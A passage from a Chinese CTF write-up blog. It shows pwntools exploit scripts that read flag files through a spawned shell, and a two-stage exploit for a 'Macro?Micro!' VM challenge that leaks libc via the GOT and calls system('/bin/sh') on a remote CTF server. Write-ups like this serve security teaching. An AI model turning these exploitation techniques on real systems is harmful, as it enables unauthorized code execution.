class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行一些命令验证shell</span></span><br><span class="line">    info(<span class="string">&quot;发送shell命令...&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;id&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;pwd&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;ls -la&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试读取flag</span></span><br><span class="line">    io.sendline(<span class="string">b&#x27;cat flag* 2&gt;/dev/null || echo &quot;NO_FLAG&quot;&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;cat /flag 2&gt;/dev/null || echo &quot;NO_FLAG&quot;&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;find . -name &quot;*flag*&quot; 2&gt;/dev/null&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收输出</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = io.recvrepeat(timeout=<span class="number">2</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        success(<span class="string">&quot;Shell输出:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 查找flag</span></span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        flags = re.findall(<span class="string">r&#x27;[a-zA-Z0-9_]+\&#123;[^&#125;]+\&#125;&#x27;</span>, output)</span><br><span class="line">        <span class="keyword">if</span> flags:</span><br><span class="line">            success(<span class="string">&quot;发现FLAG:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> flag <span class="keyword">in</span> <span class="built_in">set</span>(flags):</span><br><span class="line">                success(<span class="string">f&quot;  &gt;&gt;&gt; <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        warn(<span class="string">f&quot;读取输出异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 进入交互模式</span></span><br><span class="line">    success(<span class="string">&quot;进入交互模式，按Ctrl+C退出&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 主函数 ==========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 创建连接</span></span><br><span class="line">    io = create_connection()</span><br><span class="line">    <span class="keyword">if</span> io <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        error(<span class="string">&quot;无法建立连接，程序退出&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exploit(io)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        warn(<span class="string">&quot;用户中断&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error(<span class="string">f&quot;Exploit失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> io:</span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzg3YWVkMTJlZGY1Y2VjNDc4Nzc2NmQ1OTRlMmM2NTBfUnpSZ04xWDZUcUd2MFFDaGM3SWZ4cEx4T2xXTjdTVWFfVG9rZW46UTRDOWJwZVZhb1BzRDl4WEtHemNZdmE5bjJlXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>因为比较懒得逆向，所以直接让 Coploit 帮我跑出来了….</p>
<h3 id="Macro-Micro"><a href="#Macro-Micro" class="headerlink" title="Macro?Micro!"></a>Macro?Micro!</h3><h4 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h4><ul>
<li>对 slots 0-17 执行 add dst slot GOT_OFFSET</li>
<li>只有真正的 secret slot 是 PTR 类型，会产生有效的新 PTR</li>
<li><code>load</code> 从新 PTR 读取 printf@GOT</li>
<li>匹配低 12 位验证是 printf 地址</li>
</ul>
<ol>
<li><h4 id="Shell-程序关键修复"><a href="#Shell-程序关键修复" class="headerlink" title="Shell 程序关键修复"></a>Shell 程序关键修复</h4></li>
</ol>
<p><strong>问题</strong>：exec 块开始时只有 secret slot 可见，之前在 entry 块计算的 P_BINSH 不可用</p>
<p><strong>解决方案</strong>：在 exec 块中重新计算 <code>/bin/sh</code> 地址：</p>
<ol>
<li><h4 id="Store-溢出写入-TYPE-FUNC"><a href="#Store-溢出写入-TYPE-FUNC" class="headerlink" title="Store 溢出写入 TYPE_FUNC"></a>Store 溢出写入 TYPE_FUNC</h4></li>
</ol>
<ul>
<li>VALUE_OFFSET &#x3D; TARGET * 12 + 4 → 写入 TARGET.value</li>
<li>TYPE_OFFSET &#x3D; (TARGET-1) * 12 + 8 → 溢出写入 TARGET.type</li>
<li>TYPE_PAYLOAD &#x3D; 2 &lt;&lt; 32 → 高 4 字节是 TYPE_FUNC&#x3D;2</li>
</ul>
<ol>
<li><h4 id="动态-TARGET-选择"><a href="#动态-TARGET-选择" class="headerlink" title="动态 TARGET 选择"></a>动态 TARGET 选择</h4></li>
</ol>
<ul>
<li>TARGET &#x3D; (secret_guess + 2) % 64 → 避免与 secret slot 冲突</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NmIwZDU3ZGE1YmUxZjg2ZjkxODU3MWNlZjRlNzQxMWRfRXFLVmhQTTB4dkRtdG4yalZYcmN6TXNiU0RWVllzV09fVG9rZW46Uk9PbWJDR21yb3dEQnV4MTlpa2NyOTU0bmdoXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">完整攻击 - 修复 exec 块中参数可见性问题</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">LIBC = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(LIBC, checksec=<span class="literal">False</span>)</span><br><span class="line">LIBC_PRINTF = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">LIBC_SYSTEM = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">LIBC_BINSH = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">VALUES_OFFSET = <span class="number">0x7360</span></span><br><span class="line">PRINTF_GOT_OFFSET = <span class="number">0x6290</span></span><br><span class="line">OFFSET_TO_GOT = PRINTF_GOT_OFFSET - VALUES_OFFSET  <span class="comment"># -4304</span></span><br><span class="line">SYSTEM_OFFSET = LIBC_SYSTEM - LIBC_PRINTF</span><br><span class="line">BINSH_OFFSET = LIBC_BINSH - LIBC_PRINTF</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] printf @ libc+<span class="subst">&#123;<span class="built_in">hex</span>(LIBC_PRINTF)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] system @ libc+<span class="subst">&#123;<span class="built_in">hex</span>(LIBC_SYSTEM)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] /bin/sh @ libc+<span class="subst">&#123;<span class="built_in">hex</span>(LIBC_BINSH)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] GOT offset = <span class="subst">&#123;OFFSET_TO_GOT&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] SYSTEM offset from printf = <span class="subst">&#123;SYSTEM_OFFSET&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] BINSH offset from printf = <span class="subst">&#123;BINSH_OFFSET&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"><span class="comment"># Stage 1: 泄露 libc (完全来自 leak.py)</span></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_leak_program</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;泄露程序：对slots 0-17尝试 add slot PTR+offset, 然后 load&quot;&quot;&quot;</span></span><br><span class="line">    prog = <span class="string">f&quot;&quot;&quot;label entry</span></span><br><span class="line"><span class="string">const 63 0</span></span><br><span class="line"><span class="string">const 62 <span class="subst">&#123;OFFSET_TO_GOT&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 对每个可能的secret slot执行 add slot INT -&gt; 如果slot是PTR则产生新PTR</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        dst = <span class="number">50</span> - i</span><br><span class="line">        prog += <span class="string">f&quot;add <span class="subst">&#123;dst&#125;</span> <span class="subst">&#123;i&#125;</span> 62\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># load从新PTR读取</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        ptr = <span class="number">50</span> - i</span><br><span class="line">        target = <span class="number">32</span> - i</span><br><span class="line">        prog += <span class="string">f&quot;load <span class="subst">&#123;target&#125;</span> <span class="subst">&#123;ptr&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打印结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, <span class="number">33</span>):</span><br><span class="line">        prog += <span class="string">f&quot;print <span class="subst">&#123;i&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    prog += <span class="string">&quot;ret\nrun\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> prog</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage1_leak</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;尝试泄露printf地址 (完全来自 leak.py)&quot;&quot;&quot;</span></span><br><span class="line">    program = make_leak_program()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = subprocess.run(</span><br><span class="line">                [BINARY],</span><br><span class="line">                <span class="built_in">input</span>=program,</span><br><span class="line">                capture_output=<span class="literal">True</span>,</span><br><span class="line">                text=<span class="literal">True</span>,</span><br><span class="line">                timeout=<span class="number">2</span></span><br><span class="line">            )</span><br><span class="line">            output = result.stdout + result.stderr</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;values\[\d+\]\s*=\s*(0x[0-9a-f]+)&#x27;</span>, output, re.I):</span><br><span class="line">                val = <span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> val &gt; <span class="number">0x700000000000</span> <span class="keyword">and</span> (val &amp; <span class="number">0xfff</span>) == (LIBC_PRINTF &amp; <span class="number">0xfff</span>):</span><br><span class="line">                    <span class="keyword">return</span> val - LIBC_PRINTF</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> attempt % <span class="number">100</span> == <span class="number">99</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  Leak attempt <span class="subst">&#123;attempt+<span class="number">1</span>&#125;</span>...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"><span class="comment"># Stage 2: 调用 system - 修复版</span></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_shell_program_fixed</span>(<span class="params">secret_guess</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    修复版 shell 程序</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    关键点：</span></span><br><span class="line"><span class="string">    1. 在 entry 块中准备所有数据</span></span><br><span class="line"><span class="string">    2. store 写入 TARGET.value 和 TARGET.type</span></span><br><span class="line"><span class="string">    3. 在 exec 块中需要重新计算参数地址，因为只有 secret slot 可见</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 动态选择 TARGET 避免与 secret 冲突</span></span><br><span class="line">    TARGET = (secret_guess + <span class="number">2</span>) % <span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> TARGET &lt; <span class="number">2</span>:</span><br><span class="line">        TARGET = <span class="number">2</span></span><br><span class="line">    PREV_SLOT = TARGET - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    VALUE_OFFSET = TARGET * <span class="number">12</span> + <span class="number">4</span>       <span class="comment"># 写入 TARGET.value</span></span><br><span class="line">    TYPE_OFFSET = PREV_SLOT * <span class="number">12</span> + <span class="number">8</span>     <span class="comment"># 溢出写入 TARGET.type</span></span><br><span class="line">    TYPE_PAYLOAD = <span class="number">2</span> &lt;&lt; <span class="number">32</span>               <span class="comment"># TYPE_FUNC = 2</span></span><br><span class="line">    </span><br><span class="line">    prog = <span class="string">f&quot;&quot;&quot;label entry</span></span><br><span class="line"><span class="string">const 63 0</span></span><br><span class="line"><span class="string">const 62 <span class="subst">&#123;OFFSET_TO_GOT&#125;</span></span></span><br><span class="line"><span class="string">const 61 <span class="subst">&#123;SYSTEM_OFFSET&#125;</span></span></span><br><span class="line"><span class="string">const 60 <span class="subst">&#123;BINSH_OFFSET&#125;</span></span></span><br><span class="line"><span class="string">const 59 <span class="subst">&#123;VALUE_OFFSET&#125;</span></span></span><br><span class="line"><span class="string">const 58 <span class="subst">&#123;TYPE_OFFSET&#125;</span></span></span><br><span class="line"><span class="string">const 57 <span class="subst">&#123;TYPE_PAYLOAD&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 用 secret_guess slot 创建指针 (只有当它是真正的 secret 时才有效)</span></span><br><span class="line">    prog += <span class="string">f&quot;add 50 <span class="subst">&#123;secret_guess&#125;</span> 62\n&quot;</span>     <span class="comment"># P_GOT = secret + GOT_OFFSET</span></span><br><span class="line">    prog += <span class="string">f&quot;load 49 50\n&quot;</span>                    <span class="comment"># P_PRINTF = *P_GOT (printf 地址)</span></span><br><span class="line">    prog += <span class="string">f&quot;add 48 49 61\n&quot;</span>                  <span class="comment"># P_SYSTEM = P_PRINTF + SYSTEM_OFFSET</span></span><br><span class="line">    prog += <span class="string">f&quot;add 47 49 60\n&quot;</span>                  <span class="comment"># P_BINSH = P_PRINTF + BINSH_OFFSET</span></span><br><span class="line">    prog += <span class="string">f&quot;add 46 <span class="subst">&#123;secret_guess&#125;</span> 59\n&quot;</span>     <span class="comment"># P_VAL = secret + VALUE_OFFSET</span></span><br><span class="line">    prog += <span class="string">f&quot;add 45 <span class="subst">&#123;secret_guess&#125;</span> 58\n&quot;</span>     <span class="comment"># P_TYPE = secret + TYPE_OFFSET</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># store 写入 TARGET.value (system 地址)</span></span><br><span class="line">    prog += <span class="string">f&quot;store 46 48\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># store 写入 溢出位置 (会覆盖 TARGET.type)</span></span><br><span class="line">    prog += <span class="string">f&quot;store 45 57\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 跳转到 exec 块</span></span><br><span class="line">    prog += <span class="string">&quot;br exec\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># exec 块</span></span><br><span class="line">    prog += <span class="string">&quot;label exec\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在 exec 块中，只有 secret slot 可见</span></span><br><span class="line">    <span class="comment"># 需要重新创建参数</span></span><br><span class="line">    prog += <span class="string">&quot;const 40 0\n&quot;</span>                     <span class="comment"># C_ZERO</span></span><br><span class="line">    prog += <span class="string">f&quot;const 39 <span class="subst">&#123;BINSH_OFFSET&#125;</span>\n&quot;</span>       <span class="comment"># C_BINSH_OFFSET</span></span><br><span class="line">    prog += <span class="string">f&quot;const 38 <span class="subst">&#123;OFFSET_TO_GOT&#125;</span>\n&quot;</span>      <span class="comment"># C_GOT_OFFSET</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重新计算 /bin/sh 地址</span></span><br><span class="line">    <span class="comment"># P_GOT = secret + GOT_OFFSET</span></span><br><span class="line">    prog += <span class="string">f&quot;add 37 <span class="subst">&#123;secret_guess&#125;</span> 38\n&quot;</span></span><br><span class="line">    <span class="comment"># P_PRINTF = *P_GOT</span></span><br><span class="line">    prog += <span class="string">f&quot;load 36 37\n&quot;</span></span><br><span class="line">    <span class="comment"># P_BINSH = P_PRINTF + BINSH_OFFSET  </span></span><br><span class="line">    prog += <span class="string">f&quot;add 35 36 39\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 类型混淆：让 TARGET 变得可见</span></span><br><span class="line">    <span class="comment"># add TARGET INT secret_guess -&gt; 如果 secret_guess 是 PTR，TARGET 变成 visible</span></span><br><span class="line">    prog += <span class="string">f&quot;add <span class="subst">&#123;TARGET&#125;</span> 40 <span class="subst">&#123;secret_guess&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用 TARGET，参数是 /bin/sh 的地址</span></span><br><span class="line">    prog += <span class="string">f&quot;call <span class="subst">&#123;TARGET&#125;</span> 35\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    prog += <span class="string">&quot;ret\nrun\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> prog</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage2_shell</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;尝试获取 shell&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Running exploit (trying all 64 secret values)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 对每个可能的 secret 都尝试多次运行</span></span><br><span class="line">    <span class="keyword">for</span> secret_guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> secret_guess % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  Testing secret_guess=<span class="subst">&#123;secret_guess&#125;</span>...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        program = make_shell_program_fixed(secret_guess)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 每个 secret_guess 尝试 10 次 (因为 secret 是随机的)</span></span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment">#p = process(BINARY)</span></span><br><span class="line">                p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">41764</span>)</span><br><span class="line">                p.sendline(program.encode())</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 发送命令测试是否有 shell</span></span><br><span class="line">                p.sendline(<span class="string">b&quot;echo PWNED; id;cat flag&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    output = p.recvall(timeout=<span class="number">0.3</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;PWNED&#x27;</span> <span class="keyword">in</span> output <span class="keyword">or</span> <span class="string">b&#x27;uid=&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] SUCCESS with secret_guess=<span class="subst">&#123;secret_guess&#125;</span> at attempt <span class="subst">&#123;attempt&#125;</span>!&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(output.decode())</span><br><span class="line">                        p.close()</span><br><span class="line">                        <span class="comment"># 重新连接获取交互 shell</span></span><br><span class="line">                        p = process(BINARY)</span><br><span class="line">                        p.sendline(program.encode())</span><br><span class="line">                        p.interactive()</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                </span><br><span class="line">                p.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"><span class="comment"># Main</span></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Stage 1: Leaking libc...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    libc_base = stage1_leak()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> libc_base <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Failed to leak libc&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] libc base = 0x<span class="subst">&#123;libc_base:x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Stage 2: Getting shell...&quot;</span>)</span><br><span class="line">    <span 